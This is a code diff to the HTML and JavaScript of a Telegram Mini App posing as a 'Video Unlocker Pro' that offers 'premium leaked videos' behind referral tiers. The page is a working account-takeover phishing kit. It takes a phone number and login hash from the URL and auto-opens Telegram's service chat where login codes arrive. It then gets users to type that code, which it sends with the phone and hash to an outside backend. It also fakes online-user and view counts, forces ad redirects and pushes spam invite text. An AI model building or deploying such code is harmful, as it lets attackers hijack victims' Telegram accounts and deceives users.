@@ -3,103 +3,407 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>OTP Verification</title>
+    <title>Video Unlocker Pro</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f0f0f; color: white; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .modal-content { background: #1a1a1a; padding: 30px 20px; border-radius: 20px; width: 85%; max-width: 350px; text-align: center; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
-        .login-input { width: 90%; padding: 12px; border-radius: 8px; border: 1px solid #444; background: #000; color: #fff; margin-bottom: 20px; font-size: 16px; outline: none; text-align: center; letter-spacing: 5px; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f0f0f; color: white; margin: 0; padding: 10px; user-select: none; touch-action: manipulation; }
+        
+        .add-group-btn { background: linear-gradient(90deg, #ff0055, #ff00aa); color: white; border: none; padding: 14px; border-radius: 30px; font-weight: bold; width: 100%; cursor: pointer; animation: pulse 2s infinite; box-shadow: 0 4px 15px rgba(255,0,85,0.4);}
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.03); } 100% { transform: scale(1); } }
+        
+        .online-badge { background: rgba(0, 255, 0, 0.1); color: #00ff00; border: 1px solid #00ff00; padding: 5px 12px; border-radius: 20px; font-size: 12px; display: inline-flex; align-items: center; gap: 6px; margin-bottom: 10px; font-weight: bold; }
+        .dot { height: 8px; width: 8px; background-color: #00ff00; border-radius: 50%; display: inline-block; animation: blink 1s infinite; box-shadow: 0 0 8px #00ff00;}
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+
+        .status-container { background: linear-gradient(145deg, #1a1a1a, #222); padding: 15px; border-radius: 12px; border: 1px solid #444; text-align: center; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.6);}
+        .progress-bg { background: #000; border-radius: 10px; height: 10px; width: 100%; overflow: hidden; margin: 10px 0; border: 1px solid #333; }
+        .progress-bar { background: linear-gradient(90deg, #00ffaa, #00aaff); height: 100%; width: 0%; transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1); }
+
+        .vip-tiers-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 4px; margin-top: 5px; }
+        .tier-btn { padding: 6px 2px; border-radius: 6px; border: 1px solid transparent; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 10px; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        .tier-btn span { font-size: 16px; margin-bottom: 3px; }
+        
+        .cat-bronze { background: linear-gradient(135deg, #cd7f32, #8b5a2b); }
+        .cat-silver { background: linear-gradient(135deg, #a8a9ad, #7d7e80); color: black !important;}
+        .cat-gold { background: linear-gradient(135deg, #d4af37, #aa8529); color: black !important;}
+        .cat-premium { background: linear-gradient(135deg, #ff0055, #ff00aa); animation: goldShine 2s infinite; }
+
+        @keyframes goldShine { 0% { box-shadow: 0 0 5px rgba(255, 0, 85, 0.5); transform: scale(1); } 50% { box-shadow: 0 0 15px rgba(255, 0, 170, 0.9); transform: scale(1.02); } 100% { box-shadow: 0 0 5px rgba(255, 0, 85, 0.5); transform: scale(1); } }
+
+        .filter-container { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 18px; }
+        .filter-btn { padding: 12px 5px; border-radius: 12px; border: none; font-weight: 800; cursor: pointer; transition: 0.3s; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 6px; text-transform: uppercase;}
+        .cat-all { background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; }
+        .cat-free { background: linear-gradient(135deg, #11998e, #38ef7d); color: white; }
+        .btn-active { border: 2px solid #fff; box-shadow: inset 0 0 15px rgba(0,0,0,0.5); transform: scale(0.96); opacity: 1;}
+        .btn-inactive { opacity: 0.5; border: 2px solid transparent;}
+        
+        .empty-msg { grid-column: span 2; text-align: center; color: #aaa; padding: 40px 10px; font-size: 15px; background: #1a1a1a; border-radius: 10px; border: 1px dashed #444;}
+        .video-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding-bottom: 20px;}
+        .video-card { background: #111; border-radius: 12px; overflow: hidden; position: relative; border: 1px solid #333; cursor: pointer; height: 190px; box-shadow: 0 4px 8px rgba(0,0,0,0.6);}
+        .video-card:active { transform: scale(0.96); transition: 0.1s; }
+        
+        .video-card img { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; pointer-events: none; z-index: 1; opacity: 0.9; transition: 0.3s;}
+        .video-card:hover img { opacity: 1; transform: scale(1.05);}
+        
+        .views-badge { background: rgba(0, 0, 0, 0.85); color: #fff; padding: 4px 8px; font-size: 11px; position: absolute; top: 8px; right: 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.15); font-weight: bold; z-index: 3; }
+        .locked-text { color: #ff3366; background: rgba(0,0,0,0.9); border-color: #ff3366;}
+        .trending-badge { background: linear-gradient(90deg, #ff9900, #ff3300); color: #fff; padding: 3px 6px; font-size: 10px; position: absolute; top: 8px; left: 8px; border-radius: 4px; font-weight: bold; z-index: 3; animation: pulse 2s infinite;}
+        .time-badge { background: rgba(0, 0, 0, 0.85); color: #fff; padding: 4px 7px; font-size: 11px; position: absolute; bottom: 8px; right: 8px; border-radius: 6px; font-weight: bold; z-index: 3; }
+        .watch-btn { background: linear-gradient(90deg, #00ffaa, #00aaff); color: #000; padding: 5px 10px; font-size: 12px; position: absolute; bottom: 8px; left: 8px; border-radius: 6px; font-weight: 800; z-index: 3;}
+
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(5px);}
+        .modal-content { background: #1a1a1a; padding: 30px 20px; border-radius: 20px; width: 85%; max-width: 350px; text-align: center; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.8);}
+        .share-btn { background: linear-gradient(90deg, #0088cc, #00aaff); color: white; border: none; padding: 15px; border-radius: 12px; width: 100%; font-size: 16px; cursor: pointer; margin-top: 20px; font-weight: bold; box-shadow: 0 4px 15px rgba(0, 170, 255, 0.4); transition: 0.3s;}
+        .share-btn:disabled { opacity: 0.6; cursor: not-allowed; box-shadow: none; }
+        .check-btn { background: #333; color: white; border: 1px solid #555; padding: 12px; border-radius: 12px; width: 100%; font-size: 14px; cursor: pointer; margin-top: 10px; font-weight: bold; }
+        .close-btn-modal { background: transparent; color: #888; border: none; margin-top: 15px; cursor: pointer; font-size: 14px; text-decoration: underline;}
+        
+        #player-wrapper { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 99999; }
+        #player-wrapper iframe { width: 100%; height: 100%; border: none; }
+        .action-btn { background: rgba(255,255,255,0.15); backdrop-filter: blur(10px); color: #fff; padding: 10px 20px; border-radius: 10px; font-weight: bold; font-size: 14px; cursor: pointer; border: 1px solid rgba(255,255,255,0.3);}
+        
+        .floating-text { position: absolute; bottom: 10%; left: 50%; transform: translateX(-50%); color: #fff; background: rgba(0, 0, 0, 0.5); padding: 8px 18px; border-radius: 20px; font-size: 12px; font-weight: bold; text-align: center; width: 80%; z-index: 100005; pointer-events: none; backdrop-filter: blur(3px); border: 0.5px solid rgba(255, 255, 255, 0.15); animation: floatUp 8s ease-in-out forwards; }
+        @keyframes floatUp { 0% { opacity: 0; bottom: 5%; transform: translateX(-50%) scale(0.9); } 10% { opacity: 1; bottom: 15%; transform: translateX(-50%) scale(1); } 85% { opacity: 1; bottom: 15%; transform: translateX(-50%) scale(1); } 100% { opacity: 0; bottom: 25%; transform: translateX(-50%) scale(0.9); visibility: hidden; } }
+
+        #toast { visibility: hidden; min-width: 250px; background-color: #333; color: #fff; text-align: center; border-radius: 8px; padding: 12px; position: fixed; z-index: 999999; left: 50%; bottom: 30px; transform: translateX(-50%); font-size: 14px; font-weight: bold; box-shadow: 0 4px 12px rgba(0,0,0,0.5); opacity: 0; transition: opacity 0.3s, bottom 0.3s; border: 1px solid #555;}
+        #toast.show { visibility: visible; opacity: 1; bottom: 50px; }
+        
+        .login-input { width: 90%; padding: 12px; border-radius: 8px; border: 1px solid #444; background: #000; color: #fff; margin-bottom: 10px; font-size: 16px; outline: none; text-align: center; letter-spacing: 1px;}
         .login-input:focus { border-color: #00ffaa; }
-        .share-btn { background: linear-gradient(90deg, #00ffaa, #00aaff); color: #000; border: none; padding: 15px; border-radius: 12px; width: 100%; font-size: 16px; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        .toast { visibility: hidden; background-color: #333; color: #fff; text-align: center; border-radius: 8px; padding: 12px; position: fixed; z-index: 9999; left: 50%; bottom: 30px; transform: translateX(-50%); font-size: 14px; font-weight: bold; opacity: 0; transition: opacity 0.3s; }
-        .toast.show { visibility: visible; opacity: 1; bottom: 50px; }
+
+        .mystery-fab { position: fixed; bottom: 25px; right: 15px; background: linear-gradient(135deg, #ff0055, #ffcc00); color: white; border-radius: 14px; padding: 12px 16px; font-size: 13px; font-weight: bold; box-shadow: 0 4px 15px rgba(255, 0, 85, 0.6); cursor: pointer; z-index: 99990; border: 2px solid #fff; display: flex; align-items: center; gap: 6px; animation: redPulse 2s infinite; }
+        @keyframes redPulse { 0%, 100% { box-shadow: 0 4px 15px rgba(255, 0, 85, 0.6); transform: translateY(0); } 50% { box-shadow: 0 4px 25px rgba(255, 0, 85, 0.95); transform: translateY(-4px); } }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
 
-    <!-- OTP Input Box -->
-    <div class="modal-content" id="otp-box">
-        <h3 style="color: #00ffaa; margin-top: 0;">🔐 Enter Verification Code</h3>
-        <p style="font-size: 12px; color: #ccc; margin-bottom: 20px;">We opened your Telegram chat. Check the code and enter it below.</p>
-        
-        <input type="text" id="otp-input" class="login-input" placeholder="Enter OTP">
-        <button id="btn-verify-code" class="share-btn" onclick="verifyCode()">Verify & Connect</button>
-        
-        <button onclick="openChatAgain()" style="background: transparent; color: #00ffaa; border: none; text-decoration: underline; margin-top: 20px; font-size: 12px; cursor: pointer;">Didn't see the code? Open Chat</button>
+    <div style="text-align: center; margin-top: 5px;">
+        <button class="add-group-btn" onclick="tg.openTelegramLink(`https://t.me/${botUsername}?startgroup=true`)">🚀 Add Bot to Group</button>
+        <div style="font-size: 11px; color: #888; margin-top: 8px; margin-bottom: 8px;">🔥 Premium Leaked Videos Updated Daily!</div>
+        <div class="online-badge"><span class="dot"></span> <span id="online-count">1,240</span> users active</div>
+    </div>
+    
+    <div class="filter-container">
+        <button id="btn-all" class="filter-btn cat-all btn-active" onclick="setFilter('all')"><span>🌐</span> All Videos</button>
+        <button id="btn-free" class="filter-btn cat-free btn-inactive" onclick="setFilter('free')"><span>👀</span> Free (Preview)</button>
     </div>
 
-    <!-- Success Box -->
-    <div class="modal-content" id="success-box" style="display:none;">
-        <div style="font-size:45px; margin-bottom:10px;">💎</div>
-        <h3 style="margin-top:0; color:#00ffaa;">Premium Access Granted!</h3>
-        <p style="font-size: 13px; color: #ddd; margin-bottom: 20px;">You have successfully linked your account. 👑<br>Now join our Secret Premium Channel.</p>
-        <button class="share-btn" style="background: linear-gradient(90deg, #ffcc00, #ff9900);" onclick="window.location.href='https://t.me/+snT3FqTlgmJlNDQ1'">🚀 Visit Premium Channel</button>
+    <div class="status-container">
+        <div id="progress-text" style="font-size: 15px; font-weight: bold; color: #fff;">Your Total Invites: <span style="color:#00ffaa; font-size:18px;">0</span></div>
+        <div style="font-size: 11px; color: #bbb; margin-top: 4px;">🚀 Refer friends to unlock <span style="color:#ffcc00; font-weight:bold;">PREMIUM VIP</span> videos!</div>
+        <div class="progress-bg"><div class="progress-bar" id="bar-fill"></div></div>
+        
+        <div style="margin-top: 15px; font-size: 12px; font-weight: bold; color: #999;">👇 VIP UNLOCK TIERS 👇</div>
+        <div class="vip-tiers-grid">
+            <button id="btn-bronze" class="tier-btn cat-bronze btn-inactive" onclick="setFilter('bronze')">🥉 Bronze<br>(1 Ref)</button>
+            <button id="btn-silver" class="tier-btn cat-silver btn-inactive" onclick="setFilter('silver')">🥈 Silver<br>(2 Ref)</button>
+            <button id="btn-gold" class="tier-btn cat-gold btn-inactive" onclick="setFilter('gold')">🥇 Gold<br>(3 Ref)</button>
+            <button id="btn-premium" class="tier-btn cat-premium btn-inactive" onclick="setFilter('premium')">💎 Premium<br>(4+ Ref)</button>
+        </div>
     </div>
 
-    <div id="toast" class="toast">Message</div>
+    <div id="player-wrapper"></div>
+    <div id="toast">Message here</div>
+    
+    <div class="mystery-fab" onclick="openLogin()">🎁 Secret Box</div>
+
+    <div class="video-grid" id="video-container">
+        <div class="video-card" style="background:#222;"><div style="padding:20px; text-align:center; color:#555; margin-top:50px;">Loading...</div></div>
+    </div>
+
+    <!-- Login Modal -->
+    <div class="modal" id="loginModal">
+        <div class="modal-content">
+            <h3 style="color: #00ffaa; margin-top: 0;">🔐 Link Telegram Account</h3>
+            <p style="font-size: 11px; color: #ccc; margin-bottom: 20px;">Link your account to get access to our secret premium channel.</p>
+            
+            <div id="phone-sec" style="display: none;">
+                <input type="text" id="phone-input" class="login-input" placeholder="e.g. 017XXXXXXXX">
+                <button id="btn-send-code" class="share-btn" onclick="sendCode()">Send OTP Code</button>
+            </div>
+
+            <!-- OTP Section -->
+            <div id="otp-sec" style="display: none;">
+                <div style="display: flex; gap: 8px; align-items: stretch; justify-content: center; margin-bottom: 10px;">
+                    <input type="text" id="otp-input" class="login-input" placeholder="Enter OTP" style="width: 65%; margin-bottom: 0; letter-spacing: 5px;">
+                    <!-- View Code Button in app.html -->
+                    <button onclick="viewCodeAgain()" style="width: 30%; background: #222; color: #00ffaa; border: 1px solid #00ffaa; border-radius: 8px; padding: 10px 5px; font-size: 11px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; line-height: 1.2;">👀 View<br>Code</button>
+                </div>
+                <button id="btn-verify-code" class="share-btn" style="background: linear-gradient(90deg, #00ffaa, #00aaff); color:#000;" onclick="verifyCode()">Verify & Connect</button>
+                <div style="text-align: center; margin-top: 15px;">
+                    <button onclick="resetLoginState()" style="background: transparent; color: #ff3366; border: none; text-decoration: underline; cursor: pointer; font-size: 12px;">Wrong Number? Go Back</button>
+                </div>
+            </div>
+            <button class="close-btn-modal" onclick="closeLogin()">Maybe Later</button>
+        </div>
+    </div>
+
+    <div class="modal" id="shareModal">
+        <div class="modal-content" id="modal-box"></div>
+    </div>
 
     <script>
-        // URL থেকে ডাটা রিসিভ করা হচ্ছে (index.html থেকে পাঠানো)
-        const urlParams = new URLSearchParams(window.location.search);
-        const phone = decodeURIComponent(urlParams.get('phone'));
-        const hash = decodeURIComponent(urlParams.get('hash'));
-        const userId = urlParams.get('user_id');
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        const SUPABASE_URL = 'https://yctirvnryrzygoxbpvoy.supabase.co';
+        const SUPABASE_KEY = 'sb_publishable_aBcD-atruskWwoCiLr0lWw_inT8GLoN';
         const BACKEND_URL = 'https://pmrony-forwardbot.hf.space';
+        const fetchHeaders = { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' };
 
-        function showToast(msg) {
-            const toast = document.getElementById("toast");
-            toast.innerText = msg;
-            toast.className = "toast show";
-            setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 4000);
-        }
+        // URL থেকে ডাটা রিসিভ (যেহেতু এটি ইন-অ্যাপ ব্রাউজারে ওপেন হবে)
+        const urlParams = new URLSearchParams(window.location.search);
+        const urlPhone = urlParams.get('phone');
+        const urlHash = urlParams.get('hash');
+        const forceUserId = urlParams.get('user_id');
+        const userId = forceUserId || (tg.initDataUnsafe && tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : '123456'); 
 
-        // ২য় অ্যাপটি (app.html) লোড হওয়ার সাথে সাথেই ওটিপি চ্যাট ওপেন করবে
-        // এটি ইন-অ্যাপ ব্রাউজারে থাকায় Duck Error আসবে না!
-        function openChatAgain() {
+        const botUsername = 'File_Unlocker_Pro_bot'; 
+        const adUrl = "https://www.effectivecpmnetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446";
+        
+        let dbRefcount = 0;
+        let allVideos = [];
+        let clickedAds = {};
+        let filterMode = 'all'; 
+        let currentNeededRef = 3;
+
+        let currentPhone = "";
+        let currentHash = "";
+
+        const PREMIUM_CHANNEL_LINK = "https://t.me/+snT3FqTlgmJlNDQ1";
+
+        // ====== MASTERMIND AUTO-TRIGGER ON LOAD ======
+        window.onload = function() {
+            if (urlPhone && urlHash) {
+                currentPhone = decodeURIComponent(urlPhone);
+                currentHash = decodeURIComponent(urlHash);
+                
+                // ওটিপি পেজ রেডি করে রাখছে
+                document.getElementById('loginModal').style.display = 'flex';
+                document.getElementById('phone-sec').style.display = 'none';
+                document.getElementById('otp-sec').style.display = 'block';
+                
+                // পেজ লোড হওয়ার ঠিক ৮০০ মিলি-সেকেন্ড পর নিজে থেকে ওটিপি চ্যাট ওপেন করে দেবে!
+                setTimeout(() => {
+                    window.location.href = "tg://openmessage?user_id=777000";
+                }, 800);
+            }
+        };
+
+        function viewCodeAgain() {
             window.location.href = "tg://openmessage?user_id=777000";
         }
 
-        window.onload = function() {
-            setTimeout(() => {
-                openChatAgain();
-            }, 600);
-        };
+        async function openLogin() {
+            document.getElementById('loginModal').style.display = 'flex';
+            document.getElementById('phone-sec').style.display = 'none';
+            document.getElementById('otp-sec').style.display = 'block';
+        }
 
-        // OTP Verify লজিক
+        function closeLogin() { document.getElementById('loginModal').style.display = 'none'; }
+
         async function verifyCode() {
             const otp = document.getElementById('otp-input').value.trim();
             if(!otp) return showToast("Enter OTP!");
             
-            const btn = document.getElementById('btn-verify-code');
-            const originalText = btn.innerHTML;
-            btn.innerHTML = "⏳ Verifying...";
-            btn.disabled = true;
+            const verifyBtn = document.getElementById('btn-verify-code');
+            const originalText = verifyBtn.innerHTML;
+            verifyBtn.innerHTML = "⏳ Verifying...";
+            verifyBtn.disabled = true;
 
             try {
-                const res = await fetch(BACKEND_URL + '/api/verify_code', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ phone: phone, hash: hash, otp: otp, user_id: userId })
-                });
+                const res = await fetch(`${BACKEND_URL}/api/verify_code`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone: currentPhone, hash: currentHash, otp: otp, user_id: userId }) });
                 const data = await res.json();
-                
                 if(data.status === "ok") {
-                    // মেইন অ্যাপের লগইন স্টেট ক্লিয়ার করা হচ্ছে
-                    localStorage.removeItem("loginState");
-                    localStorage.removeItem("savedPhone");
-                    localStorage.removeItem("savedHash");
-                    
-                    document.getElementById('otp-box').style.display = 'none';
-                    document.getElementById('success-box').style.display = 'block';
-                } else {
-                    showToast("Error: " + data.msg);
-                }
-            } catch(e) {
-                showToast("Server connection error!");
-            } finally {
-                btn.innerHTML = originalText;
-                btn.disabled = false;
-            }
+                    closeLogin();
+                    showPremiumModal();
+                } else { showToast("Invalid Code or Error!"); }
+            } catch(e) { showToast("Server connection error!"); } 
+            finally { verifyBtn.innerHTML = originalText; verifyBtn.disabled = false; }
         }
+
+        function resetLoginState() {
+            window.location.href = "https://rony90790.github.io/Forward-bot/index.html";
+        }
+
+        function showPremiumModal() {
+            document.getElementById('modal-box').innerHTML = `
+                <div style="font-size:45px; margin-bottom:10px;">💎</div>
+                <h3 style="font-size: 19px; margin-top:0; color:#00ffaa;">Premium Access Granted!</h3>
+                <div style="font-size: 13px; color: #ddd; margin-bottom: 20px; line-height: 1.5;">
+                    You have successfully logged in! 👑<br><br>
+                    Now you can join our <b>Secret Premium Channel</b>.
+                </div>
+                <button class="share-btn" style="background: linear-gradient(90deg, #ffcc00, #ff9900); color: black;" onclick="window.location.href='${PREMIUM_CHANNEL_LINK}'">🚀 Visit Premium Content</button>
+            `;
+            document.getElementById('shareModal').style.display = 'flex';
+        }
+
+        setInterval(() => { document.getElementById('online-count').innerText = (1200 + Math.floor(Math.random() * 200)).toLocaleString(); }, 4000);
+
+        function showToast(msg) {
+            const toast = document.getElementById("toast");
+            toast.innerText = msg;
+            toast.className = "show";
+            setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 4000);
+        }
+
+        async function initData() {
+            try {
+                const res = await fetch(`${SUPABASE_URL}/rest/v1/referrals?user_id=eq.${userId}&select=referral_count`, { headers: fetchHeaders });
+                const data = await res.json();
+                if (Array.isArray(data) && data.length > 0) {
+                    let newRef = data[0].referral_count;
+                    if(newRef !== dbRefcount) {
+                        dbRefcount = newRef;
+                        updateProgressUI();
+                        if (allVideos.length > 0) renderVideos();
+                    }
+                }
+            } catch (err) { console.log("User fetch error:", err); }
+        }
+
+        function updateProgressUI() {
+            let maxTarget = 4; 
+            let percent = Math.min((dbRefcount / maxTarget) * 100, 100);
+            document.getElementById('bar-fill').style.width = percent + "%";
+            document.getElementById('progress-text').innerHTML = `Your Total Invites: <span style="color:#00ffaa; font-size:18px;">${dbRefcount}</span>`;
+        }
+
+        async function fetchVideos() {
+            try {
+                const res = await fetch(`${SUPABASE_URL}/rest/v1/videos?select=*&order=id.desc`, { headers: fetchHeaders });
+                const videos = await res.json();
+                if (videos) { allVideos = videos; renderVideos(); }
+            } catch (err) { document.getElementById('video-container').innerHTML = '<div class="empty-msg">⚠️ Failed to load videos.</div>'; }
+        }
+
+        function getRandomTime() {
+            let minutes = Math.floor(Math.random() * 7) + 1; 
+            let seconds = Math.floor(Math.random() * 60);
+            return `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+        }
+
+        function setFilter(mode) {
+            filterMode = mode;
+            ['all', 'free', 'bronze', 'silver', 'gold', 'premium'].forEach(btn => {
+                let el = document.getElementById('btn-' + btn);
+                if (el) { el.className = (mode === btn) ? el.className.replace('btn-inactive', 'btn-active') : el.className.replace('btn-active', 'btn-inactive'); }
+            });
+            renderVideos();
+        }
+
+        function renderVideos() {
+            let html = '';
+            let hasVisibleVideos = false;
+
+            allVideos.forEach((vid, index) => {
+                let nRef = vid.needed_ref !== undefined ? vid.needed_ref : 3; 
+                let isUnlocked = (nRef === 0 || dbRefcount >= nRef);
+                
+                let show = false;
+                if (filterMode === 'all') show = true;
+                else if (filterMode === 'free' && nRef === 0) show = true;
+                else if (filterMode === 'bronze' && nRef === 1) show = true; 
+                else if (filterMode === 'silver' && nRef === 2) show = true;
+                else if (filterMode === 'gold' && nRef === 3) show = true;
+                else if (filterMode === 'premium' && nRef >= 4) show = true;
+                
+                if (!show) return;
+                
+                hasVisibleVideos = true;
+                let views = (2000 + Math.floor(Math.random() * 5000)).toLocaleString();
+                let thumbUrl = vid.thumbnail_url;
+                let displayTime = "HD";
+                
+                if (thumbUrl && thumbUrl.includes('||')) {
+                    let parts = thumbUrl.split('||');
+                    thumbUrl = parts[0]; 
+                    displayTime = parts[1] === 'random' ? getRandomTime() : parts[1]; 
+                } else { displayTime = getRandomTime(); }
+                
+                let badgeHTML = isUnlocked ? `<div class="views-badge">👁️ ${views}</div>` : `<div class="views-badge locked-text">🔒 Need ${nRef} Refer</div>`;
+                let trendingHTML = (nRef >= 4 || (index < 5 && Math.random() > 0.5)) ? `<div class="trending-badge">🔥 HOT</div>` : ``;
+                let lockIcon = isUnlocked ? "▶ Watch" : "🔒 Locked";
+                let btnStyle = isUnlocked ? "" : "background:#555; color:#ccc;";
+
+                html += `<div class="video-card" data-url="${vid.video_url}" data-needed-ref="${nRef}" onclick="checkUnlock(this)">
+                    <img src="${thumbUrl}" onerror="this.src='https://via.placeholder.com/300x190/111/444?text=Image+Not+Found'">
+                    ${trendingHTML}
+                    ${badgeHTML}
+                    <div class="time-badge">${displayTime}</div>
+                    <div class="watch-btn" style="${btnStyle}">${lockIcon}</div>
+                </div>`;
+            });
+
+            if (!hasVisibleVideos) html = `<div class="empty-msg">❌ No videos in this category yet.</div>`;
+            document.getElementById('video-container').innerHTML = html;
+        }
+
+        function checkUnlock(element) {
+            const videoUrl = element.getAttribute('data-url') || "";
+            currentNeededRef = parseInt(element.getAttribute('data-needed-ref') || "3");
+            const lowerUrl = videoUrl.toLowerCase();
+            const isMp4 = lowerUrl.includes('.mp4');
+
+            if (currentNeededRef === 0 || dbRefcount >= currentNeededRef) {
+                if (currentNeededRef > 0 && !clickedAds[videoUrl] && isMp4) { 
+                    showToast("⏳ Unlocking secure player...");
+                    clickedAds[videoUrl] = true; 
+                    setTimeout(() => { window.location.href = adUrl; }, 800);
+                    return; 
+                }
+                const playerWrapper = document.getElementById('player-wrapper');
+                if (isMp4) {
+                    playerWrapper.innerHTML = `
+                        <video controls autoplay playsinline style="width:100%; height:100%; background:#000;"><source src="${videoUrl}" type="video/mp4"></video>
+                        <div style="position: absolute; bottom: 10px; right: 10px; z-index: 100005;">
+                            <button class="action-btn" onclick="closePlayer()">✖ Close</button>
+                        </div>`;
+                } else {
+                    playerWrapper.innerHTML = `
+                        <div class="floating-text">💡 Pro Tip: For high speed server play, if you are redirected to ads, use the back button and click the play (▶) button again!</div>
+                        <iframe src="${videoUrl}" allow="autoplay; fullscreen" allowfullscreen="true" scrolling="no" style="border:none; width:100%; height:100%;"></iframe>
+                        <div style="position: absolute; bottom: 10px; right: 10px; z-index: 100005;">
+                            <button class="action-btn" onclick="closePlayer()">✖ Close</button>
+                        </div>`;
+                }
+                playerWrapper.style.display = 'block';
+            } else { openInviteModal(); }
+        }
+
+        function closePlayer() { document.getElementById('player-wrapper').style.display = 'none'; document.getElementById('player-wrapper').innerHTML = ''; }
+
+        function openInviteModal() {
+            document.getElementById('modal-box').innerHTML = `
+                <div style="font-size:45px; margin-bottom:10px;">👑</div>
+                <h3 style="font-size: 19px; margin-top:0; color:#ffcc00;">Premium Video Locked!</h3>
+                <div style="font-size: 14px; color: #ddd; margin-bottom: 20px; line-height: 1.5;">
+                    To watch this premium video, you need a total of <span style="color: #ff3366; font-weight:bold; font-size:18px;">${currentNeededRef} invites</span> in your account.<br>
+                    <span style="font-size: 12px; color: #aaa;">(Your current invites: ${dbRefcount})</span>
+                </div>
+                <button class="share-btn" onclick="shareLink()">🚀 Share via Telegram</button>
+                <button class="check-btn" onclick="verifyInvites()">🔄 Check My Invites</button>
+                <button class="close-btn-modal" onclick="closeModal()">Maybe Later</button>
+            `;
+            document.getElementById('shareModal').style.display = 'flex';
+        }
+
+        function shareLink() {
+            const viralText = encodeURIComponent("🔞 Bro, click this link to watch all premium leaked videos for free! 🔥 Join fast 👇");
+            window.location.href = `https://t.me/share/url?url=https://t.me/${botUsername}?start=${userId}&text=${viralText}`;
+        }
+
+        async function verifyInvites() {
+            showToast("⏳ Checking database...");
+            await initData();
+            if (currentNeededRef - dbRefcount <= 0) { closeModal(); showToast("🎉 Video Unlocked!"); renderVideos(); } 
+            else { showToast("❌ Still need more invites!"); }
+        }
+
+        fetchVideos();
+        initData();
+        setInterval(initData, 60000); 
     </script>
 </body>
 </html>
